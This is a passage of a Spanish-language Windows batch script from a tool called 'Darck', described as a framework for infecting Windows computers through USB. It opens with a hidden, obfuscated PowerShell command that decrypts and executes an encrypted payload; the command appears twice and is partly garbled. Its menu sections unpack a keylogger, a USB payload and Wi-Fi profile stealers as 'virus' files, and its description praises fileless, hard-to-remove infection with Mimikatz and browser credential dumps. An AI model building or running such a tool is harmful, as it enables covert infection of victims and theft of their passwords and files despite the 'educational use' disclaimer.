echo.powerSHeLl  -NoPROf  -NOLoGo  -WInDoW  HiDDEn  -noNINteRaCTiV -C    "Invoke-Expression ( ( New-Object Management.Automation.PSCredential ' ',('76492d1116743f0423413b16050a5345MgB8AHEAegBMAFcAaABGADYAdABkACsAUABuAHkATwBOADkATgBaADMAWQAyAFEAPQA9AHwANQBlADgANQAzADYAYQA4ADEANwBhADYAZQA4AGIAMgAyADYANAA0ADQAYQA5ADQAYwAyADcAMwAwADQAOQA1ADcANAA4AGUAZQA3ADEAMwAxADgAZQA5ADMANgAxADUAMgA3ADYANwAxADYAZQBlADEAYwA5AGYANwA0ADkANwAyAGUAZABlADAANgA1ADIAOQBmAGQAMABhAGYANAA0AGUAOQBhADMAYgBkADUAYQAzADMAZgA1ADIAZQBlADQAOQA0ADYAYwBlAGQAZgBkAGMAMgA4ADQAZQA0AGIANgBkADgANABlADkANgAyADMAZgA5ADYAZgAzADYANwA1ADMAMgBiADUAOAAwADkAZABmADEAMgA3AGIAOABiAGMAMAAxAGIAZQAyAGEANAAwADIAZgA2AGMAZABhAGUANgBmADAAOQAxADgAOAAzAGIAMwBlADcANAAzADIAYgAwAGYAYgBjADIAYwAxADMAOAA1AGIAOAA1ADgAZgAxADUAZgAyADAAMQBiADMAYgAwADEAYgA5ADgAZgBkADEAMAA3ADUAZABlADIAMwA4ADcAMAAwADYANQBhADYAMAAwADEAOQBlADgAMQAxADMAMQAzADQANgBhAGYAMAAwADIAMAAwADMAYQBjAGYAMQAxADgANQAxAGUAYwBkAGUANQBlADAAOABhADkAMQA1ADYAMgBiADMAMQBhADUAZgAyAGQAZgA0ADUAMQBmADUAZgBjADAAOAAxAGQAZQA1AGEAZQA1AGYAYwA4ADgAMgA2ADYAZAA2AGEAMABkADAANgAyAGUAOAAwADgAMAA3AGEAOAA0ADAAMAA3ADMANwAzAGUAOABiAGIAZgBlADQAMgBlADAAOQAzADgANQBhAGUANQAzADEAYwBmADYAOABlADUAYQA4AGQAOAAwADMANgBkAGEANwAwADAANABmADQAYwBlADIAMgBjADYANwA3ADMAZQBjADUAZABhADAAZgAzAGYAYQBhAGMANAA5ADYAMAA5AGUAOQBiAGQAMgBiADMANABiADMAZQBiADYANgBjADgAZgBlADQAZABkAGEAMABhADgAMgBjADEAMQA4ADAAMQBkADYAOABjADMANQA4AGMAMQA1AGQAZgBiADkAOQAxADMAMgBhADUAMQA1ADAAZAA0AGEANgBjADMAOABmADkAOAA1ADIAOAA2ADQAYwBjADAAMgBjAGUAMQBhAGMAYQA3ADYAOABmAGEAMwBlADEAYQBlADQANgBlAGQAMQA2ADYAYQBlADAAYwBhADIAYwBkADIAZgA2ADUAZQAwADcANQBiADAAZABlADEANAAzADkANAAzAGQAMwBlAGYAZgA2AGUANAA5AGQAZgAzADEAOAA5AGMAMQA5ADIAOQBkADIAYwBlADMAYwA1ADAAYQBjADYAYgBjADEANgBjADUANgA1ADQAMAA3AGQAYgA5ADMAOAAzAGEAMQAwAGMANAA1AGYANQBhADAAMAA4AGEAMwBkAGEAOAAxADkANgAyAGUAYQA2AGYANgAxADQAMQA4AGIANAA3AGMAMwAxADYANgA3ADgAZAA2ADkAMwBkADIAMgAxADkAYgAzADMAZQAzADMAZgA0AGMAYgBhADcAZgA0AGQAZQBjADIAZgA5ADUANgA3AGIAZgA2ADgAZAAyAGUAMgA0ADMANAAyAGYAYgA5AGYAYgBkAGQANwA4ADYAMwA2AGUAYgAyAGEAYwAwADEANwAzADQAYQBjADgANgA2ADUAOQAzADUAYgA3ADMAMgAzAGYANwAxADkAZQAwADMAOAAyADYAYQAzAGUAZQAwAGIANwBiAGQAOAAzAGMANAAwAGQAZQAxADUAYQBjAGIANgA3ADAAYwBmADMAMAAwADEAMgBhADAAOQA4ADIAYQA2ADAAYwAyADMANgBjAGYAYgBlAGQAOQA0AGUAYwBmADQANgA3ADkAYgA1ADcAYgAwAGIANAAzADUAYwA4ADAAOABjADgAMwA1AGEANwA1ADQAMwA3AGYANwBkADYAYgAzAGIANQAxAGIAOQAzAGEAMABiADAAZAA1ADEAOQAwADkAOAA1ADMAZgBmADMAYgAyADcANgBlAGIAZgBhADEAZgAwADIAMgBjADcAMgA5AGYANAAyAGEAOABjADAAOAA5ADkAYwBlAGEAZgA3AGUANgBiAGIAZAA2AGYANQBjADkAMQBmAGEAMABlAGEAMAAwADIAYQA3AGUANwBmADcAYgAzAGEAYwA2ADcAZgAxAGIANgBhADEAMAA4ADQAMwBjADAANQA0ADIANABiADUANABjAGYAMAA1ADkANwAzADMAYgAyAGMAZgBjAGEAOQBmADgANAA2ADgAZAA5AGUAMQA2AGQAZAA5AGMANAAwADYAOQA5AGMAZgAzADUAMQAxADcAYgAxADEAYwAyADUAZQBjADAAOAAyADUANwAzADUAMABjADkAMwBkADMAMQA5ADEANgAzADgAMgAyAGEAZAAwADcANQA5AGQAMgBkADQANABlAGIANwA3AGIAOAA3ADMAMABiAGQAMgAxADYANgBjADQANAA1AGYAOQA3AGIAYgA0AGMAMABlADAAZgA1ADMAMAA2AA=='|ConvertTo-SecureString -Key  (167..182)) ).GetNetworkCredential().Password)"powerSHeLl  -NoPROf  -NOLoGo  -WInDoW  HiDDEn  -noNINteRaCTiV -C    "Invoke-Expression ( ( New-Object Management.Automation.PSCredential ' ',('76492d1116743f0423413b16050a5345MgB8AHEAegBMAFcAaABGADYAdABkACsAUABuAHkATwBOADkATgBaADMAWQAyAFEAPQA9AHwANQBlADgANQAzADYAYQA4ADEANwBhADYAZQA4AGIAMgAyADYANAA0ADQAYQA5ADQAYwAyADcAMwAwADQAOQA1ADcANAA4AGUAZQA3ADEAMwAxADgAZQA5ADMANgAxADUAMgA3ADYANwAxADYAZQBlADEAYwA5AGYANwA0ADkANwAyAGUAZABlADAANgA1ADIAOQBmAGQAMABhAGYANAA0AGUAOQBhADMAYgBkADUAYQAzADMAZgA1ADIAZQBlADQAOQA0ADYAYwBlAGQAZgBkAGMAMgA4ADQAZQA0AGIANgBkADgANABlADkANgAyADMAZgA5ADYAZgAzADYANwA1ADMAMgBiADUAOAAwADkAZABmADEAMgA3AGIAOABiAGMAMAAxAGIAZQAyAGEANAAwADIAZgA2AGMAZABhAGUANgBmADAAOQAxADgAOAAzAGIAMwBlADcANAAzADIAYgAwAGYAYgBjADIAYwAxADMAOAA1AGIAOAA1ADgAZgAxADUAZgAyADAAMQBiADMAYgAwADEAYgA5ADgAZgBkADEAMAA3ADUAZABlADIAMwA4ADcAMAAwADYANQBhADYAMAAwADEAOQBlADgAMQAxADMAMQAzADQANgBhAGYAMAAwADIAMAAwADMAYQBjAGYAMQAxADgANQAxAGUAYwBkAGUANQBlADAAOABhADkAMQA1ADYAMgBiADMAMQBhADUAZgAyAGQAZgA0ADUAMQBmADUAZgBjADAAOAAxAGQAZQA1AGEAZQA1AGYAYwA4ADgAMgA2ADYAZAA2AGEAMABkADAANgAyAGUAOAAwADgAMAA3AGEAOAA0ADAAMAA3ADMANwAzAGUAOABiAGIAZgBlADQAMgBlADAAOQAzADgANQBhAGUANQAzADEAYwBmADYAOABlADUAYQA4AGQAOAAwADMANgBkAGEANwAwADAANABmADQAYwBlADIAMgBjADYANwA3ADMAZQBjADUAZABhADAAZgAzAGYAYQBhAGMANAA5ADYAMAA5AGUAOQBiAGQAMgBiADMANABiADMAZQBiADYANgBjADgAZgBlADQAZABkAGEAMABhADgAMgBjADEAMQA4ADAAMQBkADYAOABjADMANQA4AGMAMQA1AGQAZgBiADkAOQAxADMAMgBhADUAMQA1ADAAZAA0AGEANgBjADMAOABmADkAOAA1ADIAOAA2ADQAYwBjADAAMgBjAGUAMQBhAGMAYQA3ADYAOABmAGEAMwBlADEAYQBlADQANgBlAGQAMQA2ADYAYQBlADAAYwBhADIAYwBkADIAZgA2ADUAZQAwADcANQBiADAAZABlADEANAAzADkANAAzAGQAMwBlAGYAZgA2AGUANAA5AGQAZgAzADEAOAA5AGMAMQA5ADIAOQBkADIAYwBlADMAYwA1ADAAYQBjADYAYgBjADEANgBjADUANgA1ADQAMAA3AGQAYgA5ADMAOAAzAGEAMQAwAGMANAA1AGYANQBhADAAMAA4AGEAMwBkAGEAOAAxADkANgAyAGUAYQA2AGYANgAxADQAMQA4AGIANAA3AGMAMwAxADYANgA3ADgAZAA2ADkAMwBkADIAMgAxADkAYgAzADMAZQAzADMAZgA0AGMAYgBhADcAZgA0AGQAZQBjADIAZgA5ADUANgA3AGIAZgA2ADgAZAAyAGUAMgA0ADMANAAyAGYAYgA5AGYAYgBkAGQANwA4ADYAMwA2AGUAYgAyAGEAYwAwADEANwAzADQAYQBjADgANgA2ADUAOQAzADUAYgA3ADMAMgAzAGYANwAxADkAZQAwADMAOAAyADYAYQAzAGUAZQAwAGIANwBiAGQAOAAzAGMANAAwAGQAZQAxADUAYQBjAGIANgA3ADAAYwBmADMAMAAwADEAMgBhADAAOQA4ADIAYQA2ADAAYwAyADMANgBjAGYAYgBlAGQAOQA0AGUAYwBmADQANgA3ADkAYgA1ADcAYgAwAGIANAAzADUAYwA4ADAAOABjADgAMwA1AGEANwA1ADQAMwA3AGYANwBkADYAYgAzAGIANQAxAGIAOQAzAGEAMABiADAAZAA1ADEAOQAwADkAOAA1ADMAZgBmADMAYgAyADcANgBlAGIAZgBhADEAZgAwADIAMgBjADcAMgA5AGYANAAyAGEAOABjADAAOAA5ADkAYwBlAGEAZgA3AGUANgBiAGIAZAA2AGYANQBjADkAMQBmAGEAMABlAGEAMAAwADIAYQA3AGUANwBmADcAYgAzAGEAYwA2ADcAZgAxAGIANgBhADEAMAA4ADQAMwBjADAANQA0ADIANABiADUANABjAGYAMAA1ADkANwAzADMAYgAyAGMAZgBjAGEAOQBmADgANAA2ADgAZAA5AGUAMQA2AGQAZAA5AGMANAAwADYAOQA5AGMAZgAzADUAMQAxADcAYgAxADEAYwAyADUAZQBjADAAOAAyADUANwAzADUAMABjADkAMwBkADMAMQA5ADEANgAzADgAMgAyAGEAZAAwADcANQA5AGQAMgBkADQANABlAGIANwA3AGIAOAA3ADMAMABiAGQAMgAxADYANgBjADQANAA1AGYAOQA3AGIAYgA0AGMAMABlADAAZgA1ADMAMAA2AA=='^|ConvertTo-SecureString -Key  (167..182)) ).GetNetworkCredential().Password)"
echo.         Autor :Luishiño Pericena Choque
echo.       https://lpericena.blogspot.com/
CD ..
CD ./Tools
7z x WlanProfiles.7z -p%pass%
MOVE WlanProfiles.exe ..\%folder%\%WEB% >NUL
MOVE Get-WlanProfiles.psm1 ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::::::::::::::::::: 10 .:::::::::::::::
:keylogger
CLS
set WEB=keylogger.exe
CD ./%folder%
MKDIR %WEB% >NUL
CD ..
CD ./Tools
7z x keylogger.7z -p%pass%
echo.        Autor Luishiño Pericena Choque
echo.          https://lpericena.blogspot.com/ 
MOVE keylogger.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420

::::::::::::::::::::: 11 .:::::::::::::::
:Usb-File
CLS
set WEB=Usb-File.exe
CD ./%folder%
MKDIR %WEB% >NUL
CD ..
CD ./Tools
7z x Usb-File.7z -p%pass%
echo.        Autor Luishiño Pericena Choque
echo.          https://lpericena.blogspot.com/ 
MOVE Usb-File.exe ..\%folder%\%WEB% >NUL
CD ..
echo.  Virus %WEB% creado en la carpeta "%folder%" 
echo.
goto CREAR
goto error420


:INFORMACION
CLS
::cd ./Tools/Other
::call info.bat
echo.
echo. Name        : Darck
echo.
echo. Author      : @Pericena
echo.
echo. Description : Dark es un framework para automatizar el proceso de infeccion de 
echo. ordenadores windows con el fin
echo.              de ejecutar payloads desde una USB de manera automatica.
echo.              Cuenta con una gran variedad de payloads, enfocados principalmente 
echo. en exfiltrar informacion o
echo.              archivos, por mencionar algunos: Mimikatz, GoogleChrome Dump,
echo. Firefox Dump...
echo.              Ademas el desarrollo de nuevos payloads es bastante facil e intuitiva.
echo.
echo. Sinopsis    : Dark usa propiedades unicas de la USB para identificarla tales 
echo. como el ID y la capacidad total
echo.              de almacenamiento.
echo.              Adicionalmente la infeccion es totalmente fileless (sin ningun 
echo. archivo en el disco), lo cual hace
echo.              que sea dificil de detectar y aun mas dificil de remover.
echo.              WMI es usado para detectar cuando un nuevo dispositivo es insertado,
echo. posteriormente intenta
echo.              desencriptar el codigo que ejecuta el payload usando como clave el ID
echo. y Capacidad de los
echo.              dispositivos conectados actualmente; de manera que no se puede
echo. ver/ejecutar el codigo real si el
echo.              dispositivo correcto no esta insertado.
echo.
echo.             Twitter     : https://twitter.com/LPericena
echo.             Blogger     : https://lpericena.blogspot.com/
echo.             Facebook    : https://www.facebook.com/lpericena
echo.             Youtube     : https://www.youtube.com/channel/Luishi%C3%B1oPericenaChoque
echo.
call :PainText 0C " Para continuar presione la tecla" 
CHOICE /C Y /M "."
echo.
set MSM=Hi %username% comparte con tus amig@s
goto MENU
goto Error


:MSM
DEL /F ./Tools/Other/error.inf >NUL
echo. Opciones de enviar mensaje
echo. - Enviar mensaje atraves de mis redes Sociales
echo.                Blogger   https://lpericena.blogspot.com/
echo.                Github    https://github.com/Pericena
echo. - Enviame un mensaje a mi phone "+59160969818"
echo. - Escribe un mensaje mas tu correo electronico  y envialo"
echo.
call :PainText 06 " Luego de terminar de escribir preciona la tecla [control + z] Enter"
echo.
call :PainText 04 " Escribir Mensaje de error [-]"
COPY CON error.inf >NUL
MOVE error.inf ./Tools/Other >NUL
call :PainText 0C " Para continuar presione la tecla" 
CHOICE /C Y /M "."
echo.
set MSM=Hi %username% se ha enviado tu mensaje...

start https://api.whatsapp.com/send?1=pt_BR&phone=59160969818&text=informacion
goto MENU
goto Error

:help
echo.  Command      Description
echo.----------     -----------------------------------
echo. [+]v            Comprobar si hay una nueva version disponible.
echo. [+]cls          Limpiar la pantalla
echo. [+]ls           Borra los datos ingresado de la pantalla
echo. [+]exit         Salir
echo. [+]h            Muestra la ayuda
echo. [+]show         Muestra los payloads agregados actualmente
echo. [+]sms          Enviar un mensaje de error al desarrollador @Luishino
echo. [+]clear        Resetear los payloads
echo. [+]inf          Muestra informacion sobre %ADroid%
echo. [+]use          Usar un mas payloads 
::echo. [+]reset        Resetear %ADroid%

::echo. [+]infect       Generar archivo de infeccion
::echo.Import       Importa las funciones y configuraciones.
::echo.Infect       Generar archivo de infeccion
::echo.Remove       Generar archivo de des-infeccion
::echo.Write        Escribir los payloads a nuestro dispositivo

goto SELEC
goto Eror


:error420
CLS
echo.
echo ^|-----^>[*]Incorrecto Decompile "%capp%" para Compression Level "%usrc%"
echo                 "Error dato al ingresar %heapy%" %errorlevel%
echo.    ___________                               _____ _______________   
echo.    \_   _____/_____________  ___________    /  ^|  ^|\_____  \   _  \  
echo.     ^|    __)_\_  __ \_  __ \/  _ \_  __ \  /   ^|  ^|_/  ____/  /_\  \ 
echo.     ^|        \^|  ^| \/^|  ^| \(  ^<_^> )  ^| \/ /    ^   /       \  \_/   \
echo.    /_______  /^|__^|   ^|__^|   \____/^|__^|    \____   ^|\_______ \_____  /
echo.            \/                                  ^|__^|        \/     \/ 
echo.   
call :PainText 02 "                                                                  Autor "
call :PainText 08 " Luishino Pericena Choque"
echo.             
(Dir /B "*.a") && (
echo. Success
) || (
echo.
call :PainText Cf "-------------                   ERROR                                  -------------------"  && <nul set /p=""
echo.
)
echo.                 
echo.%JAVA_HOME%
echo.                                [¡] Invalid option¡
echo.Directorio Actual: %CD%
echo.
echo. :: Descargo de responsabilidad: los desarrolladores no asumen ninguna responsabilidad y no son
echo. :: responsable de cualquier mal uso o daño causado por BlackE
echo. :: Uso exclusivo para fines educativos:
echo. :: Atacar a objetivos sin consentimiento mutuo es ilegal:
call :PainText 0C " Para continuar presione la tecla" 
CHOICE /C Y /M "."
echo.
goto MENU
if errorlevel 1 (
echo "An Error Occured, Please Check The Log (option %INPUT%)"
goto error420
)
goto Error

:EXIT
exit